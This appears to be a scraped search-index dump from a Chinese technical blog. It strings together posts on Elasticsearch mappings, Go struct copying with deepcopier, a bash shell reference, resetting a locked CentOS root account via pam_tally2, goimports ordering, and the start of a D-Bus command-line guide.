completion：用于自动补全建议。 search_as_you_type text类似类型，用于按需输入完成。 token_count：计数令牌。 等等 reference。\n常用字段数据类型参数 更多参数可以参考官方文档：mapping-params\n字段 说明 analyzer 仅text字段支持 analyzer 映射参数。 index 选项控制是否对字段值建立索引。默认为true。未索引的字段不可查询。 index_prefixes 启用术语前缀的索引，以加快前缀搜索的速度 ignore_above 长度大于 ignore_above设置的字符串将不会被索引或存储 映射的元字段 文档的元字段是保证系统正常运转的内置字段，如 _index 索引的字段 _type映射类型（7.0后取消），_id_ 文档主键。\n动态映射 dynamic 在关系型数据库中，需要事先创建好数据库，并在库中插入表。而ES中需要事先创建好索引结构（Mapping），在插入文档到索引中，系统会根据文档内容进行索引的动态映射。自动检测添加新类型和字段，被成为动态映射。\n禁用动态映射：{index_name}/_mapping dynamic 为false\nPOST student/_mapping\r{\r\u0026quot;dynamic\u0026quot;:\u0026quot;false\u0026quot;\r}\rGET student/_mappings\r显式映射 实现准备好映射关系，包含文档各字段类型，关系等，这种称之为显式映射 Explicit mapping\n动态模板 动态映射会自动推断数据类型，但这种并不完全符合所有的业务需求，而动态模板可以再动态映射之外更好的控制ES如何映射的数据类型。\n模板的匹配 match_mapping_type 对 Elasticsearch 检测到的数据类型进行操作 match unmatch ： match使用pattern匹配字段名称，unmatch 使用正则排除字段 path_match path_unmatch 使用与match一样，这里为全名称，path指的是多层json的路径。 如，需要将所有数字字段映射为integer而不是long，将所有字符串都映射为text与keyword:\n{\r\u0026quot;mappings\u0026quot;: {\r\u0026quot;dynamic_templates\u0026quot;: [\r{\r\u0026quot;integers\u0026quot;: {\r\u0026quot;match_mapping_type\u0026quot;: \u0026quot;long\u0026quot;,\r\u0026quot;mapping\u0026quot;: {\r\u0026quot;type\u0026quot;: \u0026quot;integer\u0026quot;\r}\r}\r},\r{\r\u0026quot;strings\u0026quot;: {\r\u0026quot;match_mapping_type\u0026quot;: \u0026quot;string\u0026quot;,\r\u0026quot;mapping\u0026quot;: {\r\u0026quot;type\u0026quot;: \u0026quot;text\u0026quot;,\r\u0026quot;fields\u0026quot;: {\r\u0026quot;raw\u0026quot;: {\r\u0026quot;type\u0026quot;: \u0026quot;keyword\u0026quot;,\r\u0026quot;ignore_above\u0026quot;: 256\r}\r}\r}\r}\r}\r]\r}\r}\r可以使用正则表达式来匹配字段\nPUT student12345\r{\r\u0026quot;mappings\u0026quot;: {\r\u0026quot;dynamic_templates\u0026quot;: [\r{\r\u0026quot;longs_as_strings\u0026quot;: {\r\u0026quot;match_mapping_type\u0026quot;: \u0026quot;string\u0026quot;, // 捕获的类型\r\u0026quot;match\u0026quot;: \u0026quot;pass*\u0026quot;, // 将以pass开头的string类型的映射为integer\r\u0026quot;unmatch\u0026quot;: \u0026quot;user*\u0026quot;, // 忽略以user开头的\r\u0026quot;mapping\u0026quot;: {\r\u0026quot;type\u0026quot;: \u0026quot;integer\u0026quot; // 需要映射的类型\r}\r}\r}\r]\r}\r}\rPUT student12345/_doc/1\r{\r\u0026quot;username\u0026quot;: \u0026quot;zhangsan\u0026quot;, \u0026quot;password\u0026quot;: \u0026quot;123456\u0026quot; }\r查看映射后的类型\n{\r\u0026quot;student12345\u0026quot; : {\r\u0026quot;mappings\u0026quot; : {\r\u0026quot;dynamic_templates\u0026quot; : [\r{\r\u0026quot;longs_as_strings\u0026quot; : {\r\u0026quot;match\u0026quot; : \u0026quot;pass*\u0026quot;,\r\u0026quot;unmatch\u0026quot; : \u0026quot;user*\u0026quot;,\r\u0026quot;match_mapping_type\u0026quot; : \u0026quot;string\u0026quot;,\r\u0026quot;mapping\u0026quot; : {\r\u0026quot;type\u0026quot; : \u0026quot;integer\u0026quot;\r}\r}\r}\r],\r\u0026quot;properties\u0026quot; : {\r\u0026quot;password\u0026quot; : {\r\u0026quot;type\u0026quot; : \u0026quot;integer\u0026quot;\r},\r\u0026quot;username\u0026quot; : {\r\u0026quot;type\u0026quot; : \u0026quot;text\u0026quot;,\r\u0026quot;fields\u0026quot; : {\r\u0026quot;keyword\u0026quot; : {\r\u0026quot;type\u0026quot; : \u0026quot;keyword\u0026quot;,\r\u0026quot;ignore_above\u0026quot; : 256\r}\r}\r}\r}\r}\r}\r}\rpath_match path_unmatch\nPUT test1\r{\r\u0026quot;mappings\u0026quot;: {\r\u0026quot;dynamic_templates\u0026quot;: [\r{\r\u0026quot;full_name\u0026quot;: { \u0026quot;path_match\u0026quot;: \u0026quot;document.*\u0026quot;, // 将name下的所有对象复制到外部顶级字段\r\u0026quot;path_unmatch\u0026quot;: \u0026quot;*.middlename\u0026quot;, // 这个字段除外\r\u0026quot;mapping\u0026quot;: {\r\u0026quot;type\u0026quot;: \u0026quot;text\u0026quot;,\r\u0026quot;copy_to\u0026quot;: \u0026quot;full_name\u0026quot;\r}\r}\r}\r]\r}\r}\rPUT test1/_doc/1\r{\r\u0026quot;document\u0026quot;: {\r\u0026quot;firstname\u0026quot;: \u0026quot;John\u0026quot;,\r\u0026quot;middlename\u0026quot;: \u0026quot;Winston\u0026quot;,\r\u0026quot;lastname\u0026quot;: \u0026quot;Lennon\u0026quot;\r}\r}\r当插入下列时，不成功，这里映射类型为text，与address中的对象类型不匹配所以不成功\nPUT test1/_doc/1\r{\r\u0026quot;document\u0026quot;: {\r\u0026quot;firstname\u0026quot;: \u0026quot;John\u0026quot;,\r\u0026quot;middlename\u0026quot;: \u0026quot;Winston\u0026quot;,\r\u0026quot;address\u0026quot;: {\r\u0026quot;city\u0026quot;: \u0026quot;beijing\u0026quot;,\r\u0026quot;province\u0026quot;: \u0026quot;beijing\u0026quot;,\r\u0026quot;District\u0026quot;: \u0026quot;haidian\u0026quot;\r}\r}\r}\r模板变量 {name} {dynamic_type} 占位符，在映射中会替换为字段名和检测到的动态类型\nPUT student1\r{\r\u0026quot;mappings\u0026quot;: {\r\u0026quot;dynamic_templates\u0026quot;: [\r{\r\u0026quot;named_analyzers\u0026quot;: {\r\u0026quot;match_mapping_type\u0026quot;: \u0026quot;string\u0026quot;,\r\u0026quot;match\u0026quot;: \u0026quot;*\u0026quot;,\r\u0026quot;mapping\u0026quot;: {\r\u0026quot;type\u0026quot;: \u0026quot;text\u0026quot;,\r\u0026quot;analyzer\u0026quot;: \u0026quot;{name}\u0026quot;\r}\r}\r},\r{\r\u0026quot;no_doc_values\u0026quot;: {\r\u0026quot;match_mapping_type\u0026quot;:\u0026quot;*\u0026quot;,\r\u0026quot;mapping\u0026quot;: {\r\u0026quot;type\u0026quot;: \u0026quot;{dynamic_type}\u0026quot;,\r\u0026quot;doc_values\u0026quot;: false\r}\r}\r}\r]\r}\r}\rPUT student1/_doc/1\r{\r\u0026quot;name\u0026quot;: \u0026quot;alex chow\u0026quot;, \u0026quot;age\u0026quot;: 30\r}\rPUT student1/_doc/1\r{\r\u0026quot;english\u0026quot;: \u0026quot;Some English text\u0026quot;, \u0026quot;count\u0026quot;: 5 }\rreference template-variables\n索引的类型 Elasticsearch7.x中，不在需要document的 type\nschedule_for_removal_of_mapping_types\nElasticSearch在7.x版本之前 index 类似于数据库中的 database，而 type 等同于数据库中的 table\n如：6.x API\nPUT student # index（库）\r{\r\u0026quot;mappings\u0026quot;: {\r\u0026quot;_doc\u0026quot;: { # type （表）\r\u0026quot;properties\u0026quot;: {\r\u0026quot;type\u0026quot;: { # filed (字段)\r\u0026quot;type\u0026quot;: \u0026quot;keyword\u0026quot;\r},\r\u0026quot;name\u0026quot;: {\r\u0026quot;type\u0026quot;: \u0026quot;text\u0026quot;\r},\r\u0026quot;user_name\u0026quot;: {\r\u0026quot;type\u0026quot;: \u0026quot;keyword\u0026quot;\r},\r\u0026quot;email\u0026quot;: {\r\u0026quot;type\u0026quot;: \u0026quot;keyword\u0026quot;\r},\r\u0026quot;content\u0026quot;: {\r\u0026quot;type\u0026quot;: \u0026quot;text\u0026quot;\r},\r\u0026quot;tweeted_at\u0026quot;: {\r\u0026quot;type\u0026quot;: \u0026quot;date\u0026quot;\r}\r}\r}\r}\r}\r而在7.x之后版本可以不需要\nPUT student\r{\r\u0026quot;mappings\u0026quot;: {\r\u0026quot;properties\u0026quot;: {\r\u0026quot;type\u0026quot;: {\r\u0026quot;type\u0026quot;: \u0026quot;keyword\u0026quot;\r},\r\u0026quot;name\u0026quot;: {\r\u0026quot;type\u0026quot;: \u0026quot;text\u0026quot;\r},\r\u0026quot;user_name\u0026quot;: {\r\u0026quot;type\u0026quot;: \u0026quot;keyword\u0026quot;\r},\r\u0026quot;email\u0026quot;: {\r\u0026quot;type\u0026quot;: \u0026quot;keyword\u0026quot;\r},\r\u0026quot;content\u0026quot;: {\r\u0026quot;type\u0026quot;: \u0026quot;text\u0026quot;\r},\r\u0026quot;tweeted_at\u0026quot;: {\r\u0026quot;type\u0026quot;: \u0026quot;date\u0026quot;\r}\r}\r}\r}\r在7.0以上版本使用时，必须使用 /{index_name}/_doc/{_id} 进行调用。\n_doc 为路由永久组成，可以理解为 _doc 替换之前的 type\nPUT /student/_doc/1\r{\r\u0026quot;name\u0026quot;: \u0026quot;zhangsan\u0026quot;,\r\u0026quot;user_name\u0026quot;: \u0026quot;zhangsan\u0026quot;,\r\u0026quot;email\u0026quot;: \u0026quot;1@gmail.com\u0026quot;,\r\u0026quot;content\u0026quot;: \u0026quot;北京分行、天津分行、河北分行、山西分行、辽宁分行\u0026quot;\r}\rGET /student/_doc/1\r对于7.0之前的/{index}/{type}/{action} ，的操作如_update 、_search 将紧跟{action}后面。\nPOST /student/_update/1\r{\r\u0026quot;doc\u0026quot;: {\r\u0026quot;user_name\u0026quot;: \u0026quot;lisi\u0026quot;\r}\r}\rGET /student/_search\r","permalink":"https://www.oomkill.com/2021/11/elasticsearch-mapping/","summary":"","title":"elasticsearch mapping"},{"content":" question: How use golang Copy one struct to another where structs have same members and different types\n此时需要的库\ngithub.com/ulule/deepcopier github.com/jinzhu/copier E.g.\npackage main import ( \u0026quot;fmt\u0026quot; \u0026quot;github.com/ulule/deepcopier\u0026quot; ) // Model type User struct { // Basic string field Name string // Deepcopier supports https://golang.org/pkg/database/sql/driver/#Valuer Email sql.NullString } func (u *User) MethodThatTakesContext(ctx map[string]interface{}) string { // do whatever you want return\u0026quot;hello from this method\u0026quot; } // Resource type UserResource struct { //copy from field\u0026quot;Name\u0026quot; DisplayName string `deepcopier:\u0026quot;field:Name\u0026quot;` //this will be skipped in copy SkipMe string `deepcopier:\u0026quot;skip\u0026quot;` //this should call method named MethodThatTakesContext MethodThatTakesContext string `deepcopier:\u0026quot;context\u0026quot;` Email string `deepcopier:\u0026quot;force\u0026quot;` } func main() { user := \u0026amp;User{ Name:\u0026quot;gilles\u0026quot;, Email: sql.NullString{ Valid: true, String:\u0026quot;gilles@example.com\u0026quot;, }, } resource := \u0026amp;UserResource{} deepcopier.Copy(user).To(resource) //copied from User's Name field fmt.Println(resource.DisplayName)//output: gilles fmt.Println(resource.Email) //output: gilles@example.com fmt.Println(resource.MethodThatTakesContext) //output: hello from this method } Reference copy different struct\n","permalink":"https://www.oomkill.com/2021/10/golib-deepcopier/","summary":"","title":"Go每日一库 - deepcopier"},{"content":"该文整理一些常用的shell用法，及语法，并非介绍如何使用\n变量 变量可分为两类：环境变量ENV（全局）和局部变量。\nbash环境变量\n变量名 含义 _= 上一条命令的最后一个参数 BASH_VERSION=\u0026ldquo;4.1.2(1)-release\u0026rdquo; 当前bash实例的版本号 COLORS=\u0026quot;/etc/DIR_COLORS\u0026quot; COLUMNS=80 设置该变量就给shell编辑模式和选择命令定义了编辑窗口的宽度 CVS_RSH=\u0026ldquo;ssh\u0026rdquo; DIRSTACK 代表目录栈当前的内容 EUID=0 为在shell启动时被初始化的当前用户的有效ID G_BROKEN_FILENAMES=1 GROUPS=() 当前用户所属组 HISTFILE=/root/.bash_history 历史记录文件的全路径 HISTFILESIZE=50 历史文件能包含的最大行数 HISTSIZE=50 记录在命令行历史文件中的命令行数 HOME=/root 当前用户家目录 HOSTNAME= 当前主机机器名称 HOSTTYPE=x86_64 IFS=$\u0026rsquo;\\t\\n' 内容字段分隔符，一般是空格符、制表符、和换行符，用于由命令替换，循环结构中的表和读取的输入产生的词的字段划分。 INPUTRC=/etc/inputrc readline启动文件的文件名。取代默认的~/.inputrc JAVA_HOME=/app/jdk1.6 KDENIR=/usr KDE IS PRELINKED=1 LANG=zh_CN.GB18030 LESSONPEN LINES=36 LONGNAME=root 登陆的用户名 LS_COLORS=xx MACHTYPE=x86_64-redhat-linux-gnu 包含一个描述正在运行bash的系统串 MAILCHECK=60 这个参数定义shell将隔多长时间（以秒为单位检查一次由参数MAILPATH或MAILFILE）指定的文件，看看是否有邮件到达。默认600秒 MAIL=/var/spool/mail/root 邮件全路径 OLDPWD=/root 前一个当前工作目录 OPTERR=1 如果设置为1，秒年十时毫，来自getopts内置命令的错误信息。 OPTIND=1 下一个有getopts内置命令处理的参数序号 OSTYPE=linux-gnu 自动设置称一个串，该串标书正在运行bash的操作系统，默认值有系统决定 PATH 全局PATH路径。命令搜索路径。一个有冒号分隔的目录列表，shell用它来搜索命令。默认路径有系统决定，并且由安装bash的管理员设置。 PIPESTATUS=([0]=0 [1]=1) 一个数组，包含一列最进在管道执行的前台作业的进程退出状态值。 PPID=1112 父进程的进程ID PS1=[\\u@\\h \\W]$ 主提示符串，默认值是$ PS2= \u0026gt; 次提示符串，默认值是\u0026gt; PS4=+ 当开启追踪时使用的调试提示符串，默认值是+，追踪可用set-x开启。 PWD 当前用户家目录。 SHELL=/bin/bash SHLVL=1 每启动一个bash实例就将其加1 TMOUT=3600 退出前等待超时的秒数。 UID=0 当前用户的UID，在shell启动时初始化。 USER=root 当前用户的用户名，在shell启动时初始化。 自定义环境变量 export\n默认的环境变量 env（printenv）或set\n消除本地变量和环境变量 unset 定义变量：习惯：数字不加引号，其他默认加双引号\n引号 名称 解释 单引 号 可以说是所见即所得：即将单引号内的所有内容都原样输出，或者描述为单引号里面看到的是什么就会输出什么。 双引号 把双引号内的所有内容都输出出来；如果内容中有命令（要反引下）、变量、特殊转义符等，会先把变量、命令解析出结果，然后再输出最终内容来。 无引号 把内容输出出来前，会将含有空格的字符串视为一个整体输出，如果内容中有命令、变量等，会先把变量、命令解析出结果，然后在输出最终内容来，如果字符串中带有空格等特殊字符，则不能完整的输出，需要改加双引号，一般连续的字符串，数字，路径等可以不加任何引号，不过无引号的情况最好用双引号替代之。 变量的命名规范 变量名要统一，使用全部大写字母，如APCHE_ERR_NUM；语义要清晰，能够正确表达变量内容含义，过长的英文单词可采用前几个字符代替，多个单词连接用“_”连接，引用时，最好以${APACHE_ERR_NUM}或\u0026quot;${APACHE_ERR_NUM}\u0026ldquo;的方式引用变量。\n避免无意义字符或数字：例如下面的COUNT，并不知道其确切含义\n范例1：COUNT的不确切定义 COUNT=$(grep keywords file)\n全局变量和局部变量命名\n脚本中的全局变量定义，如USER_HOME或USERHOME，在变量使用时，使用 { }将变量括或\u0026rdquo;${APACHE_ERR_NUM}\u0026quot;了；变量后还有字符串隔不开的情况下，用大括号扩一下 ${金庸}新著作 脚本中局部变量定义：存在于脚本函数（function）中的变量称为局部变量，要以local方式进行生命，使之只在本函数作用域内有效，防止变量在函数中的命名于变量外部程序中变量重名造成程序异常。下面是函数中的变量定义例子： 特殊变量 No 位置变量 $0 当前执行的shell脚本的文件名，如果执行脚本带路径则包括脚本路径。 $n 当前执行的shell脚本的第n个参数值，n=1..9，当n为0时表示脚本文件名，如果n大于9用大括号括起来${10}. $# 当前执行的shell脚本后面接的参数的总个数 $* 当前shell的所有传参的参数，将所有的参数视为单个字符串，相当于“$1$2$3..”注意$与#的区别 $@ 这个程序的所有参数“$1” “$​2” “$3” ....”，这是将参数传递给其他程序的最佳方式，因为会保留所有内嵌在每个参数里的任何空白。 进程状态变量 $$ 获得当前shell脚本的进程号（PID） $? 执行上一个指令的返回值（0为成功，非0为失败） $! 执行上一个指令的PID $_ 在此之前执行的命令或脚本的最后一个参数。 $? 返回值参考\nno 意思 0 表示允许成功 2 权限拒绝 1~125 表示运行失败，脚本命令、系统命令错误或参数传递错误 126 找到该命令了，但是无法运行 127 为找打要运行的命令$ zhangsan-bash: zhangsan: command not found $ echo $? 127 \u0026gt;128 命令被系统强制结束$ sleep 100000^C $ echo $?130 变量子串 表达式 说明 ${#string} 返回$string的长度 ${string:position} 在$string中，从位置$position之后开始提取子串 ${string:position:length} 在$string中，从位置position之后开始提取长度为length的子串 ${string#sub} 从变量string开头开始删除最短匹配sub子串 ${string##sub} 从变量开头开始删除最长匹配子串 ${string%sub} 从变量string结尾开始删除最短匹配sub子串 ${string%%sub} 从变量string结尾开始删除最长匹配sub子串 ${string/sub/rep} 使用rep，来代替第一个匹配的sub ${string/#sub/rep} 如果string前缀匹配sub就用rep代替匹配sub 变量替换 运算符号 替换 ${value:-word} 如果变量名存在且非null，则返回变量的值。否则，返回word字符串。用途：如果变量未定义，则返回默认值。范例：${value:-word}，如果value未定义，则表达式的值为word ${value:=word} 如果变量名存在且非null，则返回变量值。否则，设置这个变量值未word，并返回其值。用途：如果变量未定义，则设置变量为默认值，并返回默认值。范例：${value:=word}，如果value未定义，则设置value的值为word，返回表达式的值也为word。 ${value:?\u0026quot;not defined\u0026quot;} 如果变量名存在且非null，则返回变量的值。否则显示变量名：msg，并退出当前的命令或脚本。用途：用于捕捉由于变量未定义而导致的错误，并退出程序。范例：${value:?\u0026quot;not defined\u0026quot;}如果value未定义，则显示-bash:value:not defined并退出。 ${value:+word} 如果变量名存在且非null，则返回word。否则返回null。用途：测试变量是否存在。范例：${value:+word} 如果value已经定义，返回word（也是就是真）。 数值（整数）计算 (( )) 如果要执行简单的整数运算，只需将特定的算数表达式用 (( 和 )) 括起来即可。\nshell的算数运算符号常置于$(( 和 ))的语法中。这一语法如同双引号用能，除了内嵌双引号无需转义。\n运算符 意义 ++ \u0026ndash; 增加及减少，可前置也可放在结尾 + - ！~ 一元的正号与负号；逻辑与位的取反 * / % 乘法、除法、与取余 + - 加法、减法 \u0026lt; \u0026lt;= \u0026gt; \u0026gt;= 比较负号 == != 相等与不相等，一个“=”赋值 \u0026laquo; \u0026raquo; 向左位移 向右位移 \u0026amp; 位的AND ^ 位的异或 | 位的或 \u0026amp;\u0026amp; 逻辑的AND（make \u0026amp;\u0026amp; mak install） || 逻辑的OR（make || make install） ?: 条件表达式 = += -= *= /= \u0026amp;= ^= \u0026laquo;= \u0026raquo;= |= 赋值运算符 a+=1都相当a=a+1 ** 为幂运算：% 为取模运算（就是除法当中取余数）。 上面涉及到的参数变量必须位整数（==整型==）。不能是小数（浮点数）或者字符串。后面的bc命令可以进行浮点数运算，但一般较少用到。 echo $((a++)) 和 $((a--)) 表示先输出a自身的值，然后在进行 ++-- 的运算，echo$((++a)) 和 echo$((--a)) 表示先进行 ++-- 的运算，在输出a自身的值。 记忆方法：变量在前，先输出变量值，变量在后，就是先运算后输出变量的值\nlet let赋值表达式，【注】let赋值表达式功能等同于((赋值表达式)) ，例如 let i=i+8\nexpr expr（evaluate（求值）expressions（表达式））命令：\nexpr命令一般用于整数值，但也可用于字符串，用来求表达式变量的值，同时expr是一个手工命令行计算器。\nexpr 2 + 2 expr 2 - 1 expr 2 * 1 expr 2 \\* 1 expr 3 % 2 expr$[$a+$b]表达式形式\n# expr $[2+3]\r5\r# expr $[2**3]\r8\r# echo $[2**3]\r8\r2、\r# a=1\r# b=2\r# expr $[$a+$b]\r3\rexpr 将其后的串解释为表达式计算其值，运算符前后需有空格\rbc bc是UNXI下的计算器，它也可以用在命令行中，bc支持科学计算，所以这种方法功能非常强大\n# 一般工作中不这么用\r$ bc\rbc 1.06.95\rCopyright 1991-1994, 1997, 1998, 2000, 2004, 2006 Free Software Foundation, Inc.\rThis is free software with ABSOLUTELY NO WARRANTY.\rFor details type `warranty'. 1*5\r5\r1/5\r0\r5/3\r1\r10+2\r12\r# $ echo 5+10|bc\r15\r$ echo 5*20|bc\r100\r$ echo 10%3|bc\r1\r$ echo 10.5+3.1|bc\r13.6\r# 与expr的区别\r$ echo `expr 1+1`\r1+1\r$ echo `expr 1 + 1`\r2\r$ echo `expr 1 + 1.2`\rexpr: 参数数目错误\r$ echo 1+1|bc\r2\r$ echo 1 + 1|bc\r2\r# 保留小数位数\r$ echo \u0026quot;scale=2;10.45246/2.2315\u0026quot;|bc\r4.68\r$ echo \u0026quot;10.45246/2.2315\u0026quot;|bc 4\r$ echo 10.45246/2.2315|bc 4\r# 进制转换\r$ echo \u0026quot;obase=2;2\u0026quot;|bc\r10\r$ echo \u0026quot;obase=10;10\u0026quot;|bc\r10\r$ echo \u0026quot;obase=8;10\u0026quot;|bc 12\r范例：通过命令输出1+2+3+4..+10=XX的表达式，并计算出结果\r$ echo `seq -s \u0026quot;+\u0026quot; 10`=`seq -s '+' 10|bc` 1+2+3+4+5+6+7+8+9+10=55\r$ echo `seq -s \u0026quot;+\u0026quot; 10`=$((`seq -s \u0026quot;+\u0026quot; 10`))\r1+2+3+4+5+6+7+8+9+10=55\r$ echo `seq -s \u0026quot;+\u0026quot; 10`=`seq -s ' + ' 10|xargs expr` 1+2+3+4+5+6+7+8+9+10=55\r$ echo {1..10}|tr \u0026quot; \u0026quot; \u0026quot;+\u0026quot;\r1+2+3+4+5+6+7+8+9+10\r$ echo {1..10}|tr \u0026quot; \u0026quot; \u0026quot;+\u0026quot;|bc\r55\r$[] # echo $[2+3]\r5\r# echo $[ 2 * 3 ]\r6\r条件测试 ​\n测试语句 语法 说明 语法1：test \u0026lt;测试表达式\u0026gt; 利用test命令进行条,test后有一个空格 语法2：[ \u0026lt;测试表达式\u0026gt; ] 通过单中括号进行,单中括号中的内容前后都有一个空格 语法3：[[ \u0026lt;测试表达式\u0026gt; ]] 通过双中括号进行,双中括号中的内容前后都有一个空格 语法4：((\u0026lt;测试表达式\u0026gt;)) 通过双小括号进行,双小括号中的内容前后无空格 在[[ ]]中可以使用通配符进行模式匹配。\u0026amp;\u0026amp; || \u0026gt; \u0026lt;等操作符可以应用于[[ ]]中，不能应用于[ ]中。[]中一般用-a、-o、-gt 等替代对整数进行关系运算，也可以使用Shell的算数运算符 (( ))\n文件测试操作符 测试操作符 说明 -f 文件file 若文件存在且为普通文件则真 -d 文件 directory 若文件存在且为目录文件则真 -s 文件 size 若文件存在切不为空（文件大小非0）则真 -e 文件 exist 若文件存在则真，要区别-f -r 文件 read 若文件存在且可读则真 -w 文件write 若文件存在且可写则真 -x 文件 excute 若文件存在且可执行则真 -L 文件link 若文件存在且为链接文件则真 f1 -nt f2 never than 若文件f1比文件f2新则真 f1 -ot f2 older than 若文件f1比文件f2旧则真 f1 -ef f2 两个文件具有同样的设备号和i结点号 -k file 文件是否設置了粘着位(Sticky Bit)，如果是，則返回 true。 [ -k $file ] 返回 false。 -u file 文件是否設置了 SUID 位，如果是，則返回 true。 [ -u $file ] 返回 false。 -x file 文件是否可執行，如果是，則返回 true。 -p file 文件是否是有名管道，如果是，則返回 true。 [ -p $file ] 返回 false。 -w file 文件是否可寫，如果是，則返回 true。 [ -w $file ] 返回 true。 字符串测试操作符 常用字符串测试操作符 说明 -z \u0026ldquo;string\u0026rdquo; 若串长度为0则真，-z可以理解为zero -n \u0026ldquo;string\u0026rdquo; 若长度不为0则真，-n可以理解为no zero \u0026ldquo;string1\u0026rdquo;=\u0026ldquo;string2\u0026rdquo; 若串1等于串2则真，可使用“==”代替“=” \u0026ldquo;string1\u0026rdquo; != \u0026ldquo;string2\u0026rdquo; 若串1不等于串2则真。但不能用“!==”代替“!=” 二元比较操作符 在[]中使用的比较符 在[[ ]]中使用的比较符 说明 -eq == equal的缩写，相等返回真 -ne != not equal的缩写，不相等返回真 -gt \u0026gt; 大于greater than -ge \u0026gt;= 大于等于 greate equal -lt \u0026lt; 小于类似less than -le \u0026lt;= 小于等于less equal 逻辑操作符 在[ ]中使用的比较符 在[[ ]]中使用的比较符 说明 -a \u0026amp;\u0026amp; and 与，两端都为真，则真 -o || or 或，两端有一个为真则真 ! ! not 非，相反则为真 字体颜色 颜色范围：30-37\necho -e \u0026quot;\\033[30m 黑字体 test \\033[0m\u0026quot;\recho -e \u0026quot;\\033[31m 红字体 test \\033[0m\u0026quot;\recho -e \u0026quot;\\033[32m 绿字体 test \\033[0m\u0026quot;\recho -e \u0026quot;\\033[33m 黄字体 test \\033[0m\u0026quot;\recho -e \u0026quot;\\033[34m 蓝字体 test \\033[0m\u0026quot;\recho -e \u0026quot;\\033[35m 紫字体 test \\033[0m\u0026quot;\recho -e \u0026quot;\\033[36m 天蓝字 test \\033[0m\u0026quot;\recho -e \u0026quot;\\033[37m 白色字 test \\033[0m\u0026quot;\r40-47\necho -e \u0026quot;\\033[40;37m 黑底白字 welcome \\033[0m\u0026quot;\recho -e \u0026quot;\\033[41;37m 红底白字 welcome \\033[0m\u0026quot; echo -e \u0026quot;\\033[42;37m 绿底白字 welcome \\033[0m\u0026quot; echo -e \u0026quot;\\033[43;37m 黄底白字 welcome \\033[0m\u0026quot; echo -e \u0026quot;\\033[44;37m 蓝底白字 welcome \\033[0m\u0026quot; echo -e \u0026quot;\\033[45;37m 紫底白字 welcome \\033[0m\u0026quot; echo -e \u0026quot;\\033[46;37m 天蓝底白字 welcome \\033[0m\u0026quot; echo -e \u0026quot;\\033[47;37m 白底白字 welcome \\033[0m\u0026quot; echo -e \u0026quot;\\033[47;30m 白底黑字 welcome \\033[0m\u0026quot; 通过定义变量方式给字体加颜色 #!/bin/bash\rred='\\033[31m'\rgreen='\\033[32m'\ryellow='\\033[33m'\rblue='\\033[34m'\rpink='\\E[1;35m'\rend='\\E[0m'\recho -e \u0026quot;${red} ======red======${end}\u0026quot;\recho -e \u0026quot;${yellow} =====yellow=====${end}\u0026quot;\r循环 当型循环和直到型循环 while条件句\r语法：\rwhile 条件\rdo\r指令...\rdone\runtil\nuntil 条件.\rdo\r指令...\rdone\rfor循环\nfor varName in 变量取值列表\rdo\r指令...\rdone\r读取文件 1. cat.log|while read line\rdo\rdone\r2.\rwhile read line\rdo\rdone\u0026lt;a.log\r3)\rexec \u0026lt;a.log\rwhile read line\rdo\rdone\rlinux产生随机数的 系统环境变量$RANDAM 范围 ==0-32767==\n随机数01-99之间的数字\n$[RANDOM%99+1] # 一个数和一个数取余这个数，这个数一定小于这个数\ropenssl: openssl rand -base64 8\n通过时间获得随机数（date）: date +%s%N\n/dev/random设备：/dev/random设备，存储着系统当前运行的环境的实时数据。它可以看作是系统某个时候，唯一值数据，因此可以用作随机数元数据。我们可以通过文件读取方式，读得里面数据。我们可以通过文件读取方式，读得里面数据。/dev/urandom这个设备数据与random里面一样。只是，他是非阻塞的随机数发生器，读取操作不会产生阻塞。\nUUID：cat /proc/sys/kernel/random/uuid\nmkpasswd -l 8\n数组 Shell 数组用==括号==来表示，元素用==\u0026ldquo;空格\u0026rdquo;==符号分割开：array=(value1 value2 ... valuen)\n使用下标来定义数组: array[0]=value0 读取数组：${array[index]} 数组中的所有元素：${array[*]}\u0026quot; 或 ${array[@]}\u0026quot; 数组的长度： ${#array[*]} 或 ${#array[@]} ","permalink":"https://www.oomkill.com/2021/10/awesome-bash-shell/","summary":"","title":"bash shell常用示例"},{"content":"\n进入后，找到linux16 开头的一行！将ro改为 rw init=/sysroot/bin/sh\n查看passwd和 shadow 发现用户并没有锁，于是想到，应该是pam的设置。\npam_tally2.so deny=6 onerr=fail unlock_time=120 默认log在： /var/log/tallylog\nchroot /sysroot # 使用pam_tally2命令解锁 pam_tally2 --user=root --reset rw init=/sysroot/bin/sh Reference Centos7.x破解密码\npam_tally2锁用户\n","permalink":"https://www.oomkill.com/2021/10/account-locked-due-to-10-failed-logins/","summary":"","title":"Account locked due to 10 failed logins"},{"content":"import 规范\n引入了三种类型的包，标准库包，第三方包，程序内部包，建议采用如下方式进行组织你的包：\n有顺序的引入包，不同的类型采用空格分离，\n第一种标准库 第二是第三方包 第三是项目包。 在项目中不要使用相对路径引入包，在goland中可以使用如下设置自动格式化为引入标准\n打开设置：Editor \u0026gt; Code Style \u0026gt; Go，选择import标签，将排序改为goimports, 剩下的按照自己喜好进行修改即可\nReference goimports-group\n","permalink":"https://www.oomkill.com/2021/10/go-mod-specification/","summary":"","title":"goland设置import规范"},{"content":"D-Bus是Linux使用的进程间通信机制，允许各个进程互相访问，而不需要为每个其他组件实现自定义代码。即使对于系统管理员来说，这也是一个相当深奥的主题，但它确实有助于解释linux的另一部分是如何工作的。\n这里主要介绍 dbus-send 与 GDbus cli工具，其他的还有QtDbus , d-feet\u0026hellip;\n命令行工具dbus-send ，是freedesktoop提供的dbus包配套的命令客户端工具，可用于发送dbus消息。\nGDbus GLib实现的dbus工具。较与 dbus-send，拥有更完整的功能。\nd-feet: 可以处理所有D-Bus服务的GUI应用程序。\ndbus-send dbus有两种消息总线 （message bus）：system bus 和 session bus，通过使用 --system和 --session 选项来通过dbus-send 向系统总线或会话总线发送消息。如果两者都未指定，默认为**session bus*.\n借此，顺道聊下 system bus 和 session bus：\nSystem Bus:\n在桌面上，为所有用户提供一条总线. 专用于系统服务。 有关于低级时间，例如 网络连接，USB设备。 在嵌入式Linux系统中，system bus是唯一D-Bus类型。 Session Bus:\n每个用户会话一个实例 为用户应用提供那个桌面服务。 连接到 X-session 参数选项 参数 说明 --dest=NAME 这个是必选的参数，指定要接收消息的接口名称。例如 org.freedesktop.ExampleName --print-reply 打印回复消息 --print-reply=literal 如选项一样，打印回复正文。如有特殊字符，如对象或 object 则按字面打印，没有标点符号、转义字符等。 --reply-timeout= 可选参数，等待回复的超时时长，单位为 毫秒。 --system --session --type=method_call signal 